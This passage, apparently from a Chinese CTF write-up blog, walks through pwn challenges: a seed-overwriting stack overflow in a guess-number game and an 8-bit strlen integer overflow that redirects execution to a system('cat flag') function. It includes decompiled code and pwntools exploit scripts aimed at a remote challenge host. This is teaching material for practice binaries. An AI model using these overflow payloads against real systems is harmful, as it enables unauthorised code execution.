class="line">    <span class="built_in">printf</span>(<span class="string">"Please input your guess number:"</span>);</span><br><span class="line">    __isoc99_scanf(<span class="string">"%d"</span>, &amp;v5);              </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"---------------------------------"</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v5 != v7 )              <span class="comment">//输入的数的随机生成的数相等</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"GG!"</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    v3 = <span class="string">"Success!"</span>;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Success!"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  sub_C3E(v3);                  </span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br></pre></td></tr></table></figure>

<h3 id="sub-C3E函数"><a href="#sub-C3E函数" class="headerlink" title="sub_C3E函数"></a>sub_C3E函数</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">__<span class="function">int64 <span class="title">sub_C3E</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"You are a prophet!\nHere is your flag!"</span>);</span><br><span class="line">  system(<span class="string">"cat flag"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>sub_C3E函数调用了system函数</p>
<h2 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h2><p>想办法让输入的数和生成的随机数相等就好了</p>
<h3 id="关于rand函数，srand函数和seed"><a href="#关于rand函数，srand函数和seed" class="headerlink" title="关于rand函数，srand函数和seed"></a>关于rand函数，srand函数和seed</h3><p><strong>int num = rand() % n</strong> 产生0到n-1这n个整数中的一个随机整数<br><strong>rand() % (b-a+1)+ a</strong> 就表示a到b 之间的一个随机整数<br><strong>int num = rand() % n +a;</strong> 其中的a是起始值，n-1+a是终止值，n是整数的范围<br>srand初始化随机种子,rand产生随机数,这个题是从1~6中间随机产生随机数。在调用rand()函数时，必须先利用srand()设好随机数种子，如果未设随机数种子，rand()在调用时会自动设随机数种子为1。对于这个题来说随机种子设置为1和0都可以。</p>
<h3 id="get函数"><a href="#get函数" class="headerlink" title="get函数"></a>get函数</h3><p>get函数造成了栈溢出漏洞，可以覆盖seed[0],就可以制造伪随机数了<br>查看get函数参数v7在栈中的大小</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-0000000000000030</span> var_30          db ?</span><br><span class="line"><span class="number">-000000000000002F</span>                 db ? ; undefined</span><br><span class="line"><span class="number">-000000000000002</span>E                 db ? ; undefined</span><br><span class="line"><span class="number">-000000000000002</span>D                 db ? ; undefined</span><br><span class="line"><span class="number">-000000000000002</span>C                 db ? ; undefined</span><br><span class="line"><span class="number">-000000000000002B</span>                 db ? ; undefined</span><br><span class="line"><span class="number">-000000000000002</span>A                 db ? ; undefined</span><br><span class="line"><span class="number">-0000000000000029</span>                 db ? ; undefined</span><br><span class="line"><span class="number">-0000000000000028</span>                 db ? ; undefined</span><br><span class="line"><span class="number">-0000000000000027</span>                 db ? ; undefined</span><br><span class="line"><span class="number">-0000000000000026</span>                 db ? ; undefined</span><br><span class="line"><span class="number">-0000000000000025</span>                 db ? ; undefined</span><br><span class="line"><span class="number">-0000000000000024</span>                 db ? ; undefined</span><br><span class="line"><span class="number">-0000000000000023</span>                 db ? ; undefined</span><br><span class="line"><span class="number">-0000000000000022</span>                 db ? ; undefined</span><br><span class="line"><span class="number">-0000000000000021</span>                 db ? ; undefined</span><br><span class="line"><span class="number">-0000000000000020</span>                 db ? ; undefined</span><br><span class="line"><span class="number">-000000000000001F</span>                 db ? ; undefined</span><br><span class="line"><span class="number">-000000000000001</span>E                 db ? ; undefined</span><br><span class="line"><span class="number">-000000000000001</span>D                 db ? ; undefined</span><br><span class="line"><span class="number">-000000000000001</span>C                 db ? ; undefined</span><br><span class="line"><span class="number">-000000000000001B</span>                 db ? ; undefined</span><br><span class="line"><span class="number">-000000000000001</span>A                 db ? ; undefined</span><br><span class="line"><span class="number">-0000000000000019</span>                 db ? ; undefined</span><br><span class="line"><span class="number">-0000000000000018</span>                 db ? ; undefined</span><br><span class="line"><span class="number">-0000000000000017</span>                 db ? ; undefined</span><br><span class="line"><span class="number">-0000000000000016</span>                 db ? ; undefined</span><br><span class="line"><span class="number">-0000000000000015</span>                 db ? ; undefined</span><br><span class="line"><span class="number">-0000000000000014</span>                 db ? ; undefined</span><br><span class="line"><span class="number">-0000000000000013</span>                 db ? ; undefined</span><br><span class="line"><span class="number">-0000000000000012</span>                 db ? ; undefined</span><br><span class="line"><span class="number">-0000000000000011</span>                 db ? ; undefined</span><br><span class="line"><span class="number">-0000000000000010</span> seed            dd <span class="number">2</span> dup(?)    <span class="comment">//srand函数种子seed</span></span><br><span class="line"><span class="number">-0000000000000008</span> var_8           dq ?</span><br><span class="line">+<span class="number">0000000000000000</span>  s              db <span class="number">8</span> dup(?)</span><br><span class="line">+<span class="number">0000000000000008</span>  r              db <span class="number">8</span> dup(?)</span><br><span class="line">+<span class="number">0000000000000010</span></span><br><span class="line">+<span class="number">0000000000000010</span> ; end of <span class="built_in">stack</span> variables</span><br></pre></td></tr></table></figure>

<p>发现var_30在栈中占0x20，可以覆盖到seed[0],然后就可以制造伪随机数了。我们可以覆盖为为1，然后循环10次就行了。可以构造payload = ‘A’ * 0x20 + p64(1)</p>
<h3 id="ctype和dll"><a href="#ctype和dll" class="headerlink" title="ctype和dll"></a>ctype和dll</h3><p>需要python和C语言，可以使用python标准库中的ctype模块进行C语言和python的混合编程</p>
<h3 id="libc共享库"><a href="#libc共享库" class="headerlink" title="libc共享库"></a>libc共享库</h3><p><strong>直接使用ldd查找</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Thriumph@ubuntu:~/pwn$ ldd <span class="number">1</span></span><br><span class="line">	linux-vdso.so<span class="number">.1</span> =&gt;  (<span class="number">0x00007ffefffc8000</span>)</span><br><span class="line">	libc.so<span class="number">.6</span> =&gt; /lib/x86_64-linux-gnu/libc.so<span class="number">.6</span> (<span class="number">0x00007fb8c9246000</span>)</span><br><span class="line">	/lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span> (<span class="number">0x00007fb8c9813000</span>)</span><br></pre></td></tr></table></figure>

<p>or</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">elf = ELF(<span class="string">'./1'</span>)</span><br><span class="line">libc = elf.libc</span><br></pre></td></tr></table></figure>

<h2 id="exp-4"><a href="#exp-4" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line">p=remote(<span class="string">'111.198.29.45'</span>,<span class="string">'49039'</span>)</span><br><span class="line">libc=cdll.LoadLibrary(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">payload=<span class="string">"a"</span>*<span class="number">0x20</span>+p64(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Your name:'</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">libc.srand(<span class="number">1</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">    num=str(libc.rand()%<span class="number">6</span>+<span class="number">1</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'number:'</span>)</span><br><span class="line">    p.sendline(num)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="补"><a href="#补" class="headerlink" title="补"></a>补</h2><p>另一种做法，编写一个C语言程序，用0x61616161作为种子生成随机数列</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *a=<span class="string">"aaaaaaaa"</span>;</span><br><span class="line">    srand(<span class="number">0x61616161</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;=<span class="number">9</span>;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> test=rand()%<span class="number">6</span>+<span class="number">1</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%d\n"</span>,test);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>查看生成的数列</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Thriumph@ubuntu:~/pwn$ ./a.out</span><br><span class="line">5646623622</span><br></pre></td></tr></table></figure>

<p>依次输入就行了</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">Thriumph@ubuntu:~/pwn$ ./1</span><br><span class="line">-------------------------------</span><br><span class="line">Welcome to a guess number game!</span><br><span class="line">-------------------------------</span><br><span class="line">Please let me know your name!</span><br><span class="line">Your name:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa</span><br><span class="line">-------------Turn:1-------------</span><br><span class="line">Please input your guess number:5</span><br><span class="line">---------------------------------</span><br><span class="line">Success!</span><br><span class="line">-------------Turn:2-------------</span><br><span class="line">Please input your guess number:6</span><br><span class="line">---------------------------------</span><br><span class="line">......</span><br><span class="line">-------------Turn:10-------------</span><br><span class="line">Please input your guess number:2</span><br><span class="line">---------------------------------</span><br><span class="line">Success!</span><br><span class="line">You are a prophet!</span><br></pre></td></tr></table></figure>

<h1 id="int-overflow"><a href="#int-overflow" class="headerlink" title="int overflow"></a>int overflow</h1><p>整数溢出漏洞</p>
<h2 id="整数溢出的原理"><a href="#整数溢出的原理" class="headerlink" title="整数溢出的原理"></a>整数溢出的原理</h2><p>整数分为有符号和无符号两种类型，有符号数以最高位作为其符号位，即正整数最高位为1，负数为0，无符号数取值范围为非负数，常见各类型占用字节数如下：</p>
<table>
<thead>
<tr>
<th align="center">类型</th>
<th align="center">占用字节数</th>
<th align="center">值范围</th>
</tr>
</thead>
<tbody><tr>
<td align="center">int</td>
<td align="center">4</td>
<td align="center">-2147483648~2147483647</td>
</tr>
<tr>
<td align="center">Long int</td>
<td align="center">4</td>
<td align="center">-2147483648~2147483647</td>
</tr>
<tr>
<td align="center">Unsigned int</td>
<td align="center">4</td>
<td align="center">0~4294967295</td>
</tr>
<tr>
<td align="center">Unsigned short int</td>
<td align="center">2</td>
<td align="center">0~65535</td>
</tr>
<tr>
<td align="center">Unsigned short int</td>
<td align="center">4</td>
<td align="center">0~4294967295</td>
</tr>
</tbody></table>
<p>定义一个unsigned short int类型(0~65535)的变量a，b,a=1,b=65537<br>写一个C语言代码测试一下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">short</span> <span class="keyword">int</span> a=<span class="number">1</span>,b=<span class="number">65537</span>;</span><br><span class="line">    <span class="keyword">if</span>(a==b)</span><br><span class="line">    &#123;	</span><br><span class="line">    	<span class="built_in">printf</span>(<span class="string">"溢出，a=b"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"sb"</span>);</span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>运行一下结果为 溢出，a=b<br>也就是说，对于一个2字节的Unsigned short int型变量，它的有效数据长度为两个字节，当它的数据长度超过两个字节时，就溢出，溢出的部分则直接忽略，使用相关变量时，使用的数据仅为最后2个字节，因此就会出现65537等于1的情况，其他类型变量和数值与之类似。</p>
<h2 id="查看保护"><a href="#查看保护" class="headerlink" title="查看保护"></a>查看保护</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] '/home/Thriumph/re/int_overflow'</span><br><span class="line">    Arch:     i386<span class="number">-32</span>-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      <span class="function">No <span class="title">PIE</span> <span class="params">(<span class="number">0x8048000</span>)</span></span></span><br></pre></td></tr></table></figure>

<p>开启了NX保护。没有canary，没有PIE。</p>
<h2 id="查看main（）函数-1"><a href="#查看main（）函数-1" class="headerlink" title="查看main（）函数"></a>查看main（）函数</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0</span>);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"---------------------"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"~~ Welcome to CTF! ~~"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"       1.Login       "</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"       2.Exit        "</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"---------------------"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Your choice:"</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%d"</span>, &amp;v4);</span><br><span class="line">  <span class="keyword">if</span> ( v4 == <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    login();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v4 == <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"Bye~"</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Invalid Choice!"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>输入1登陆，输入2离开</p>
<h2 id="查看login-函数"><a href="#查看login-函数" class="headerlink" title="查看login()函数"></a>查看login()函数</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">login</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+0h] [ebp-228h]</span></span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [esp+200h] [ebp-28h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">0x20</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(&amp;buf, <span class="number">0</span>, <span class="number">0x200</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Please input your username:"</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;s, <span class="number">0x19</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Hello %s\n"</span>, &amp;s);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Please input your passwd:"</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">0x199</span>u);</span><br><span class="line">  <span class="keyword">return</span> check_passwd(&amp;buf);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>需要输入username和passwd，username和passwd函数都有长度限制，接受了一个最大长度为0x199的password。</p>
<h2 id="查看check-passwd"><a href="#查看check-passwd" class="headerlink" title="查看check_passwd"></a>查看check_passwd</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> *__<span class="function">cdecl <span class="title">check_passwd</span><span class="params">(<span class="keyword">char</span> *s)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> dest; <span class="comment">// [esp+4h] [ebp-14h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 v3; <span class="comment">// [esp+Fh] [ebp-9h]</span></span><br><span class="line"></span><br><span class="line">  v3 = <span class="built_in">strlen</span>(s);</span><br><span class="line">  <span class="keyword">if</span> ( v3 &lt;= <span class="number">3u</span> || v3 &gt; <span class="number">8u</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Invalid Password"</span>);</span><br><span class="line">    result = (<span class="keyword">char</span> *)fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Success"</span>);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    result = <span class="built_in">strcpy</span>(&amp;dest, s);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p> unsigned _ int8 v3; // [esp+Fh] [ebp-9h]设置了一个用一个字节8bit的变量v3，存passwd，之后看到了不安全函数strlen（），然后strcpy将passwd拷贝进stack中，dest距ebp是14h,所以stack中给出的保存passwd的大小为0x14，十进制是20，passwd接受0x199（十进制409），长度大于1字节，所以存在整数溢出，password字符串的长度可以是3-8个字符，也可以是259-264个字符。</p>
<h2 id="查看what-is-this函数"><a href="#查看what-is-this函数" class="headerlink" title="查看what_is_this函数"></a>查看what_is_this函数</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">what_is_this</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">"cat flag"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>调用了system函数，system函数地址是0804868B</p>
<h2 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h2><p>strlen存在溢出漏洞，因为32位程序中strlen把结果放在al中，而al是八位的，所以能存的最大值为255（1111 1111），如果超过255，就会导致整形溢出。例如261（1 0000 0101‬）最终输出的结果就是（0000 0101），而read(0,&amp;buf,0x199u)获取的输入可以远大于255,所以我们输入的s只要在259-264即可造成整数溢出，但是要求输入的s长度在(4,8]之间。所以通过整数溢出来越过这个限制，然后跳转到0x0804868B的函数就可以获取flag。<br>之后就要分析一下需要覆盖多少位了。在字符串拷贝之前，先把拷贝的源地址和目的地址压入堆栈，查看整个函数的汇编代码，就会发现，在函数最开始，压入了ebp变量，在函数结尾，存在一条leave指令，而在32位程序中，leave指令等于mov esp,ebp和pop ebp两条指令的组合，也就是说，在覆盖函数返回地址之前，还有一次出栈操作，出栈数据大小4字节，即覆盖之前还需将这4字节覆盖了，才能实现跳转指向what_is_this函数。</p>
<h2 id="exp-5"><a href="#exp-5" class="headerlink" title="exp"></a>exp</h2><p>259-264之间随机选择一个数。选择262，264-0x14-4-4=234<br>想要覆盖到返回地址，先使用0x14个数据覆盖stack拷贝的passed的内存区域，然后使用4字节数据覆盖ebp，再使用”cat flag”的地址覆盖返回地址，最后接上262剩余的数据即可。</p>
<p>可构造payload<br>payload = “a” * 0x14 + “aaaa” + p32(cat_flag_addr) + “a” * 234</p>
<p>payload1 = ‘a’ * 0x14 + “aaaa” + p32(cat_flag_addr)<br>payload1 = payload1+ ‘a’ * (262-int(len(payload1)))</p>
<p>payload2=”a” * 0x14 + “aaaa” + p32(cat_flag_addr)<br>payload2 = payload2.ljust( 262,”a”)</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=remote(<span class="string">"111.198.29.45"</span>,<span class="string">"32607"</span>)</span><br><span class="line">cat_flag_addr = <span class="number">0x0804868B</span></span><br><span class="line">p.recvuntil(<span class="string">'choice:'</span>)</span><br><span class="line">p.sendline(<span class="string">"1"</span>)</span><br><span class="line">p.recvuntil(<span class="string">'username:\n'</span>)</span><br><span class="line">p.sendline(<span class="string">"Thriumph"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"passwd:\n"</span>)</span><br><span class="line">payload = <span class="string">"a"</span> * <span class="number">0x14</span> + <span class="string">"aaaa"</span> + p32(cat_flag_addr) + <span class="string">"a"</span> * <span class="number">234</span></span><br><span class="line"><span class="comment">#payload1 = 'a' * 0x14 + "aaaa" + p32(cat_flag_addr)</span></span><br><span class="line"><span class="comment">#payload1 = payload1+ 'a' * (262-int(len(payload1)))</span></span><br><span class="line"><span class="comment">#payload2="a" * 0x14 + "aaaa" + p32(cat_flag_addr)</span></span><br><span class="line"><span class="comment">#payload2 = payload2.ljust( 262,"a")</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"><span class="comment">#p.sendline(payload1)</span></span><br><span class="line"><span class="comment">#p.sendline(payload2)</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h1 id="when-did-you-born"><a href="#when-did-you-born" class="headerlink" title="when did you born"></a>when did you born</h1><p>一道简单的溢出</p>
<h2 id="查看文件"><a href="#查看文件" class="headerlink" title="查看文件"></a>查看文件</h2><p>没有开启pie保护</p>
<h2 id="ida分析-2"><a href="#ida分析-2" class="headerlink" title="ida分析"></a>ida分析</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">char</span> v4; <span class="comment">// [rsp+0h] [rbp-20h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v5; <span class="comment">// [rsp+8h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v6; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0L</span>L);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0L</span>L);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="number">0L</span>L);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"What's Your Birth?"</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%d"</span>, &amp;v5);</span><br><span class="line">  <span class="keyword">while</span> ( getchar() != <span class="number">10</span> )</span><br><span class="line">    ;</span><br><span class="line">  <span class="keyword">if</span> ( v5 == <span class="number">1926</span> )</span><br><span class="line">  